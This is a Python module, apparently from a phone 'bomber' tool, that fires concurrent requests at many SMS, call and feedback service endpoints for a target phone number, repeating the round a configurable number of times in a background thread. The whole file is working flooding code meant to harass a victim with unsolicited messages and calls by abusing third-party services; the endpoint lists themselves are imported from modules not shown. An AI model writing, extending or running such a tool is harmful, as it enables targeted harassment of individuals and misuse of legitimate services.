from asyncio import ensure_future, gather, new_event_loop, set_event_loop
from aiohttp import ClientSession
from threading import Thread

from .Attack.Services import urls
from .Attack.Feedback_Services import feedback_urls
from .Config import check_config



async def request(session, url):
    try:
        type_attack = ('SMS', 'CALL', 'FEEDBACK') if check_config()['type_attack'] == 'MIX' else check_config()['type_attack']

        if url['info']['attack'] in type_attack:
            async with session.request(url['method'], url['url'], params=url.get('params'), cookies=url.get('cookies'), headers=url.get('headers'), data=url.get('data'), json=url.get('json'), timeout=20) as response:
                return await response.text()
    except:
        pass



async def async_attacks(number):
    async with ClientSession() as session:
        services = (urls(number) + feedback_urls(number)) if check_config()['feedback'] == 'True' else urls(number)
        tasks = [ensure_future(request(session, service)) for service in services]
        await gather(*tasks)



def _run_attack_in_thread(number, replay):
    '''Run attacks in separate thread with new event loop'''
    loop = new_event_loop()
    set_event_loop(loop)

    try:
        for _ in range(int(replay)):
            loop.run_until_complete(async_attacks(number))
    finally:
        loop.close()



def start_async_attacks(number, replay):
    '''Запуск бомбера - returns thread object for monitoring'''

    # Run in separate thread to avoid event loop conflicts with Flet
    thread = Thread(target=_run_attack_in_thread, args=(number, replay))
    thread.daemon = True
    thread.start()

    # Return thread so UI can monitor it
    return thread